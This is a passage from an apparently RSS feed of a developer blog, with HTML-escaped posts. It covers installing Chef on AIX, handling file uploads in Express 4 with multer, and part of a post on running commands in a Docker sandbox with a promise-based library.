******************************************************************************
End of installp PREVIEW.  No apply operation has actually occurred.
******************************************************************************
l5a1vp051_pub &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since we are sure now, that the installation works, we remove the preview flag and finalize the installation.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;l5a1vp051_pub &amp;gt; installp -aXY -d chef-12.0.0-rc.0-1.powerpc.bff chef
+-----------------------------------------------------------------------------+
                    Pre-installation Verification...
+-----------------------------------------------------------------------------+
Verifying selections...done
Verifying requisites...done
Results...

SUCCESSES
---------
  Filesets listed in this section passed pre-installation verification
  and will be installed.

  Selected Filesets
  -----------------
  chef 12.0.0.1                               # The full stack of chef

  &amp;lt;&amp;lt; End of Success Section &amp;gt;&amp;gt;

+-----------------------------------------------------------------------------+
                   BUILDDATE Verification ...
+-----------------------------------------------------------------------------+
Verifying build dates...done
FILESET STATISTICS
------------------
    1  Selected to be installed, of which:
        1  Passed pre-installation verification
  ----
    1  Total to be installed

Filesystem size changed to 2097152
+-----------------------------------------------------------------------------+
                         Installing Software...
+-----------------------------------------------------------------------------+

installp:  APPLYING software for:
        chef 12.0.0.1

Restoring files, please wait.
14485 files restored.
Thank you for installing Chef!
Finished processing all filesets.  (Total time:  2 mins 4 secs).

+-----------------------------------------------------------------------------+
                                Summaries:
+-----------------------------------------------------------------------------+

Installation Summary
--------------------
Name                        Level           Part        Event       Result
-------------------------------------------------------------------------------
chef                        12.0.0.1        USR         APPLY       SUCCESS
chef                        12.0.0.1        ROOT        APPLY       SUCCESS

l5a1vp051_pub &amp;gt; chef-client -v
Chef: 12.0.0.rc.0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The chef-client is successfully installed now.&lt;/p&gt;
&lt;h2 id=&quot;hello-world&quot;&gt;Hello World&lt;/h2&gt;
&lt;p&gt;Now we want to ensure that the system works. Therefore we create a simple hello world cookbook that creates a file &lt;code&gt;x.txt&lt;/code&gt; in the home directory and prints &lt;code&gt;HELLO WORLD AIX.&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ mkdir -p  cookbooks/helloworld/recipes/
$ &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; cookbooks
$ cat &amp;gt; helloworld/recipes/default.rb
file &lt;span class=&quot;string&quot;&gt;&quot;#{ENV['HOME']}/x.txt&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
  content &lt;span class=&quot;string&quot;&gt;'HELLO WORLD AIX'&lt;/span&gt;
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We use chef-zero to run the helloworld cookbook.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ chef-client -z -o helloworld
[2014-12-03T08:14:41-06:00] WARN: No config file found or specified on &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; line, using &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; line options.
Starting Chef Client, version 12.0.0.rc.0
[2014-12-03T08:14:46-06:00] WARN: Run List override has been provided.
[2014-12-03T08:14:46-06:00] WARN: Original Run List: []
[2014-12-03T08:14:46-06:00] WARN: Overridden Run List: [recipe[helloworld]]
resolving cookbooks &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; run list: [&lt;span class=&quot;string&quot;&gt;&quot;helloworld&quot;&lt;/span&gt;]
Synchronizing Cookbooks:
  - helloworld
Compiling Cookbooks...
Converging 1 resources
Recipe: helloworld::default
  * file[/home/u0015844/x.txt] action create
    - create new file /home/u0015844/x.txt
    - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /home/u0015844/x.txt from none to 787ec7
    --- /home/u0015844/x.txt        2014-12-03 08:14:46.000000000 -0600
    +++ /home/u0015844/.x.txt20141203-10027096-1qnz8tq      2014-12-03 08:14:46.000000000 -0600
    @@ -1 +1,2 @@
    +HELLO WORLD AIX
[2014-12-03T08:14:46-06:00] WARN: Skipping final node save because override_runlist was given

Running handlers:
Running handlers complete
Chef Client finished, 1/1 resources updated &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 3.754716 seconds
l5a1vp051_pub &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;center&gt;&lt;img src=&quot;/articles/ibm-aix-chef/hellochef.png&quot; alt=&quot;A Chef run on AIX 7.1&quot; title=&quot;Chef on AIX&quot; width=&quot;700px&quot;&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;Since we know that Chef works very well on AIX, let’s start deploying more applications.&lt;/p&gt;
&lt;p&gt;Follow my profile on &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock/followers&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Simple file uploads with Express 4</title>
      <link>http://lollyrock.com/articles/express4-file-upload/</link>
      <pubDate>Fri, 14 Nov 2014 18:00:00 -0600</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/express4-file-upload/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://expressjs.com/&quot;&gt;Express&lt;/a&gt; is a great web framework for Javascript. Quite often you have to deal with file uploads. Although this may seems like a trivial point, it has its challenges, especially if everything is asynchronous. &lt;/p&gt;
&lt;h2 id=&quot;using-busboy&quot;&gt;Using Busboy&lt;/h2&gt;
&lt;p&gt;For some time, &lt;a href=&quot;https://github.com/mscdex/busboy&quot;&gt;Busboy&lt;/a&gt; was the best solution, because it uses the Javascript eventing properly. The downside is the complex setup as the sample from the github profile demonstrates:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; http = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'http'&lt;/span&gt;),
    inspect = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'util'&lt;/span&gt;).inspect;

&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; Busboy = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'busboy'&lt;/span&gt;);

http.createServer(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;req, res&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.method === &lt;span class=&quot;string&quot;&gt;'POST'&lt;/span&gt;) {
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; busboy = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Busboy({ headers: req.headers });
    busboy.on(&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;fieldname, file, filename, encoding, mimetype&lt;/span&gt;) &lt;/span&gt;{
      &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'File ['&lt;/span&gt; + fieldname + &lt;span class=&quot;string&quot;&gt;']: filename: '&lt;/span&gt; + filename + &lt;span class=&quot;string&quot;&gt;', encoding: '&lt;/span&gt; + encoding + &lt;span class=&quot;string&quot;&gt;', mimetype: '&lt;/span&gt; + mimetype);
      file.on(&lt;span class=&quot;string&quot;&gt;'data'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data&lt;/span&gt;) &lt;/span&gt;{
        &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'File ['&lt;/span&gt; + fieldname + &lt;span class=&quot;string&quot;&gt;'] got '&lt;/span&gt; + data.length + &lt;span class=&quot;string&quot;&gt;' bytes'&lt;/span&gt;);
      });
      file.on(&lt;span class=&quot;string&quot;&gt;'end'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
        &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'File ['&lt;/span&gt; + fieldname + &lt;span class=&quot;string&quot;&gt;'] Finished'&lt;/span&gt;);
      });
    });
    busboy.on(&lt;span class=&quot;string&quot;&gt;'field'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;fieldname, val, fieldnameTruncated, valTruncated&lt;/span&gt;) &lt;/span&gt;{
      &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'Field ['&lt;/span&gt; + fieldname + &lt;span class=&quot;string&quot;&gt;']: value: '&lt;/span&gt; + inspect(val));
    });
    busboy.on(&lt;span class=&quot;string&quot;&gt;'finish'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
      &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'Done parsing form!'&lt;/span&gt;);
      res.writeHead(&lt;span class=&quot;number&quot;&gt;303&lt;/span&gt;, { Connection: &lt;span class=&quot;string&quot;&gt;'close'&lt;/span&gt;, Location: &lt;span class=&quot;string&quot;&gt;'/'&lt;/span&gt; });
      res.end();
    });
    req.pipe(busboy);
  } &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.method === &lt;span class=&quot;string&quot;&gt;'GET'&lt;/span&gt;) {
    res.writeHead(&lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;, { Connection: &lt;span class=&quot;string&quot;&gt;'close'&lt;/span&gt; });
    res.end(&lt;span class=&quot;string&quot;&gt;'&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;\
               &amp;lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;\
                &amp;lt;input type=&quot;text&quot; name=&quot;textfield&quot;&amp;gt;&amp;lt;br /&amp;gt;\
                &amp;lt;input type=&quot;file&quot; name=&quot;filefield&quot;&amp;gt;&amp;lt;br /&amp;gt;\
                &amp;lt;input type=&quot;submit&quot;&amp;gt;\
              &amp;lt;/form&amp;gt;\
            &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;'&lt;/span&gt;);
  }
}).listen(&lt;span class=&quot;number&quot;&gt;8000&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'Listening for requests'&lt;/span&gt;);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is not fun if you need to support this complex setup for multiple routes in express. Do not get me wrong, busboy is a great module and does the job well, but it is just not the abstraction you would like to have in your project. In normal cases you &lt;code&gt;just&lt;/code&gt; need a file upload.&lt;/p&gt;
&lt;h2 id=&quot;use-multer&quot;&gt;Use multer&lt;/h2&gt;
&lt;p&gt;Here comes &lt;a href=&quot;https://github.com/expressjs/multer&quot;&gt;multer&lt;/a&gt;. The final piece that fits between express and busboy. It takes all complex tasks behind the scenes and offers a configurable express middleware. Let’s try it out:&lt;/p&gt;
&lt;p&gt;Set up a &lt;code&gt;package.json&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;{
  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;expres-upload-test&quot;&lt;/span&gt;,
  &lt;span class=&quot;string&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;simple form upload test&quot;&lt;/span&gt;,
  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;0.1.0&quot;&lt;/span&gt;,
  &lt;span class=&quot;string&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;: {
    &lt;span class=&quot;string&quot;&gt;&quot;express&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~4.0.0&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;multer&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;0.1.6&quot;&lt;/span&gt;
  },
  &lt;span class=&quot;string&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;: {
  },
  &lt;span class=&quot;string&quot;&gt;&quot;scripts&quot;&lt;/span&gt;: {},
  &lt;span class=&quot;string&quot;&gt;&quot;engines&quot;&lt;/span&gt;: {
    &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;0.10.x&quot;&lt;/span&gt;,
    &lt;span class=&quot;string&quot;&gt;&quot;npm&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;1.4.0&quot;&lt;/span&gt;
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To implement the server, create a &lt;code&gt;server.js&lt;/code&gt; that combines express with multer. It is 17 lines including an extra hello world route.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; express = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'express'&lt;/span&gt;),
    multer  = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'multer'&lt;/span&gt;)

&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; app = express()
app.use(multer({ dest: &lt;span class=&quot;string&quot;&gt;'./uploads/'&lt;/span&gt;}))

app.get(&lt;span class=&quot;string&quot;&gt;'/'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;req, res&lt;/span&gt;)&lt;/span&gt;{
  res.send(&lt;span class=&quot;string&quot;&gt;'hello world'&lt;/span&gt;);
});

app.post(&lt;span class=&quot;string&quot;&gt;'/'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;req, res&lt;/span&gt;)&lt;/span&gt;{
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(req.body) &lt;span class=&quot;comment&quot;&gt;// form fields&lt;/span&gt;
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(req.files) &lt;span class=&quot;comment&quot;&gt;// form files&lt;/span&gt;
    res.status(&lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;).end()
});

app.listen(&lt;span class=&quot;number&quot;&gt;3000&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Of course you can try this by using &lt;a href=&quot;https://github.com/jakubroztocil/httpie&quot;&gt;httpie&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ http &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; POST http://localhost:3000/ file@~/Downloads/test.pdf
HTTP/1.1 200 OK
Connection: keep-alive
Date: Sat, 15 Nov 2014 11:15:21 GMT
X-Powered-By: Express
content-length: 278
content-type: application/json

{
    &lt;span class=&quot;string&quot;&gt;&quot;file&quot;&lt;/span&gt;: {
        &lt;span class=&quot;string&quot;&gt;&quot;buffer&quot;&lt;/span&gt;: null, 
        &lt;span class=&quot;string&quot;&gt;&quot;encoding&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;7bit&quot;&lt;/span&gt;, 
        &lt;span class=&quot;string&quot;&gt;&quot;extension&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;pdf&quot;&lt;/span&gt;, 
        &lt;span class=&quot;string&quot;&gt;&quot;fieldname&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;file&quot;&lt;/span&gt;, 
        &lt;span class=&quot;string&quot;&gt;&quot;mimetype&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;text/plain&quot;&lt;/span&gt;, 
        &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;f459076685288eed5b4b45f80a11b908.pdf&quot;&lt;/span&gt;, 
        &lt;span class=&quot;string&quot;&gt;&quot;originalname&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;test.pdf&quot;&lt;/span&gt;, 
        &lt;span class=&quot;string&quot;&gt;&quot;path&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;uploads/f459076685288eed5b4b45f80a11b908.pdf&quot;&lt;/span&gt;, 
        &lt;span class=&quot;string&quot;&gt;&quot;size&quot;&lt;/span&gt;: 59353, 
        &lt;span class=&quot;string&quot;&gt;&quot;truncated&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;upload-per-route&quot;&gt;Upload per route&lt;/h2&gt;
&lt;p&gt;The example above works well in most use cases. If you chain multiple middleware together, you will find out, that express uses streams, but this does not fully work with middleware. Events are not piped between middleware. If you use two express middlewares in a chain and each tries to catch all stream events and calls &lt;code&gt;next()&lt;/code&gt; when all the eventing is done, the second middleware will not receive the required events anymore. &lt;/p&gt;
&lt;p&gt;In such a case you need to optimize the middleware per route. Therefore I do not recommend to use multer as a global middleware for express. Instead I would add multer to the routes that specifically require it. &lt;/p&gt;
&lt;p&gt;A working example would look like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; express = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'express'&lt;/span&gt;),
    multer  = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'multer'&lt;/span&gt;)

&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; app = express()

app.get(&lt;span class=&quot;string&quot;&gt;'/'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;req, res&lt;/span&gt;)&lt;/span&gt;{
  res.send(&lt;span class=&quot;string&quot;&gt;'hello world'&lt;/span&gt;);
});

app.post(&lt;span class=&quot;string&quot;&gt;'/'&lt;/span&gt;,[ multer({ dest: &lt;span class=&quot;string&quot;&gt;'./uploads/'&lt;/span&gt;}), &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;req, res&lt;/span&gt;)&lt;/span&gt;{
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(req.body) &lt;span class=&quot;comment&quot;&gt;// form fields&lt;/span&gt;
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(req.files) &lt;span class=&quot;comment&quot;&gt;// form files&lt;/span&gt;
    res.status(&lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;).end()
}]);

app.listen(&lt;span class=&quot;number&quot;&gt;3000&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;See also:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-encryption/&quot;&gt;Encrypt and decrypt content with Nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-sha512/&quot;&gt;SHA 512 Hashs with nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/content-security-policy/&quot;&gt;Applied Content Security Policy for Nginx and Nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://arlimus.github.io/articles/ready.for.es6/&quot;&gt;Ready for ES6?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Execute commands in a Docker sandbox</title>
      <link>http://lollyrock.com/articles/execute-in-docker-sandbox/</link>
      <pubDate>Sat, 27 Sep 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/execute-in-docker-sandbox/</guid>
      <author></author>
      <description>&lt;p&gt;If we deal a lot with data from an untrusted source, we want to operate on data in a sandbox. For example, every file we handle may includes a virus and tries to attack our machine. &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://docker.io/&quot;&gt;Docker&lt;/a&gt; is an amazing tool to run arbitrary commands inside a sandbox. It is useful for testing applications or building complete application images as offered by &lt;a href=&quot;https://registry.hub.docker.com/&quot;&gt;Docker Hub&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;To address the use case, it is required to build containers on demand and mix them with pre-known commands (which typically fit in a Dockerfile) and custom user defined commands.&lt;/p&gt;
&lt;h2 id=&quot;problem&quot;&gt;Problem&lt;/h2&gt;
&lt;p&gt;Currently, it is quite difficult to mix both approaches in Docker. Normally you have two possibilities:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create a custom Dockerfile and build a new image&lt;/li&gt;
&lt;li&gt;Start a base image like Ubuntu and use the shell with arbitrary commands&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The first approach has the advantage that everything is settled during build time. Docker is optimized for this approach. In Docker this would look like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;docker build -t yourimage .
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The second approach is available in Docker, but optimized for human input. Quite often you do something like&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;docker run -i -t ubuntu /bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Why not use the second approach via your applications, where you start executing commands in a special docker container. Docker offers a API with &lt;a href=&quot;https://docs.docker.com/reference/api/docker_remote_api_v1.9/#attach-to-a-container&quot;&gt;stdin, stdout and stderr streams&lt;/a&gt;. As mentioned earlier, an application may converts images via GraphicsMagic. It would be more secure to run those tasks in a sandbox. By using Docker, we can easily recover to an initial state. Even if an attacker would infect the system, we would recover it to a clean system. This helps to mitigate security risks. Additionally this does not leave trash behind on your host server.&lt;/p&gt;
&lt;p&gt;By using the Docker Streams API, we are able to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;✓ run arbitrary commands&lt;/li&gt;
&lt;li&gt;✓ run commands in sandbox&lt;/li&gt;
&lt;li&gt;✓ run command automatically (via Streams API)&lt;/li&gt;
&lt;li&gt;✗ know when the command finished (streams only offer text output)&lt;/li&gt;
&lt;li&gt;✗ get command error code (is not displayed in text output)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A use case, that combines both approaches:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;
$ docker run -i -t ubuntu:trusty /bin/bash
root@5ead76a77765:/&lt;span class=&quot;comment&quot;&gt;# apt-get update&lt;/span&gt;
root@5ead76a77765:/&lt;span class=&quot;comment&quot;&gt;# apt-get install -y graphicsmagick wget&lt;/span&gt;
root@5ead76a77765:/&lt;span class=&quot;comment&quot;&gt;# wget -q -O avatar.jpg https://avatars3.githubusercontent.com/u/1178413?v=2&amp;amp;s=460&lt;/span&gt;
root@5ead76a77765:/&lt;span class=&quot;comment&quot;&gt;# gm convert -size 120x120 avatar.jpg -resize 120x120 +profile &quot;*&quot; thumbnail.jpg&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;How would you do the same in an automated fashion?&lt;/p&gt;
&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
&lt;p&gt;Assume you want to convert various images with changing urls. We need to execute arbitrary commands and detect, when a command is finished. This is essential, because we may not know how long a download or conversion takes. &lt;/p&gt;
&lt;p&gt;To detect a process exit, we need to invent something new. Since the input and the output stream are decoupled, we do not know what output corresponds to a specific input. We require a way to correlate input and output. Instead of sending the plain command via Streams API, we generate a unique id for each request. Additionally we add a specific command that outputs the completed task id and the exit code.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// generate process id&lt;/span&gt;
&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; id = uuid.v4();

&lt;span class=&quot;comment&quot;&gt;// add exit code to command&lt;/span&gt;
&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; cmd2 = command + &lt;span class=&quot;string&quot;&gt;';echo exit task '&lt;/span&gt; + id + &lt;span class=&quot;string&quot;&gt;' $?\n'&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I completed this approach with &lt;a href=&quot;https://github.com/chris-rock/docker-exec&quot;&gt;docker-exec&lt;/a&gt;. Now we are able to run the commands in docker. It also uses Javascript Promises instead of plain callbacks. This enables us to easily chain commands. The example introduced above can be written as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ds = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; DockerRunner();
ds.start().then(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;stream&lt;/span&gt;) &lt;/span&gt;{
    stream.pipe(process.stdout);
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'---&amp;gt; run apt-get update\n'&lt;/span&gt;);
    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ds.run(&lt;span class=&quot;string&quot;&gt;'apt-get update'&lt;/span&gt;);
}).then(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'---&amp;gt; install gm\n'&lt;/span&gt;);
    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ds.run(&lt;span class=&quot;string&quot;&gt;'apt-get install -y graphicsmagick wget'&lt;/span&gt;);
}).then(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'---&amp;gt; convert image\n'&lt;/span&gt;);
    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ds.run(&lt;span class=&quot;string&quot;&gt;'gm convert -size 120x120 avatar.jpg -resize 120x120 +profile &quot;*&quot; thumbnail.jpg'&lt;/span&gt;);
}).then(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'---&amp;gt; stop container\n'&lt;/span&gt;);
    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ds.stop();
}).then(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'---&amp;gt; Done without error\n'&lt;/span&gt;);
    done();
}).catch(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;err&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;'Done with error\n'&lt;/span&gt;);
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(err);
});
&lt;/code&gt;&lt;/pre&gt;
